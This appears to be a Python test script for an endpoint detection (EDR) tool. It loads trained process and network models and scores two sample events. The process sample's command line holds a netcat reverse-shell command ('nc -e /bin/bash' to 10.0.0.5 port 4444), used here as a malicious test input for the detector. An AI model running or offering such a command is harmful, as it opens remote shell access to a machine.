import joblib
import numpy as np

from agents.feature_extractor import (
    ProcessFeatureExtractor,
    NetworkFeatureExtractor,
)

MODEL_DIR = "data/models/EDR"

process_model = joblib.load(f"{MODEL_DIR}/process_model.pkl")
process_scaler = joblib.load(f"{MODEL_DIR}/process_scaler.pkl")
network_model = joblib.load(f"{MODEL_DIR}/network_model.pkl")
network_scaler = joblib.load(f"{MODEL_DIR}/network_scaler.pkl")

process_extractor = ProcessFeatureExtractor()
network_extractor = NetworkFeatureExtractor()


def score_process(event):
    """Score a process event using the trained models"""
    features = process_extractor.extract_features(event)
    values = np.array([list(features.values())])
    scaled = process_scaler.transform(values)
    probabilities = process_model.predict_proba(scaled)[0]

    positive_index = list(process_model.classes_).index(1)
    return float(probabilities[positive_index])

def score_network(event):
    """Score a network event using the trained models"""
    features = network_extractor.extract_features(event)
    values = np.array([list(features.values())])
    scaled = network_scaler.transform(values)
    probabilities = network_model.predict_proba(scaled)[0]

    positive_index = list(network_model.classes_).index(1)
    return float(probabilities[positive_index])


process_event = {
    "pid": 1234,
    "ppid": 100,
    "name": "nc",
    "path": "/usr/bin/nc",
    "command_line": "nc -e /bin/bash 10.0.0.5 4444",
    "parent_name": "bash",
    "user": "dudu",
    "is_first_seen": True,
}

network_event = {
    "source_ip": "192.168.56.10",
    "source_port": 50000,
    "dest_ip": "10.0.0.5",
    "dest_port": 4444,
    "process_name": "nc",
    "protocol": "tcp",
    "bytes_sent": 50,
    "bytes_received": 50,
}

print(f"Process ML score: {score_process(process_event):.4f}")
print(f"Network ML score: {score_network(network_event):.4f}")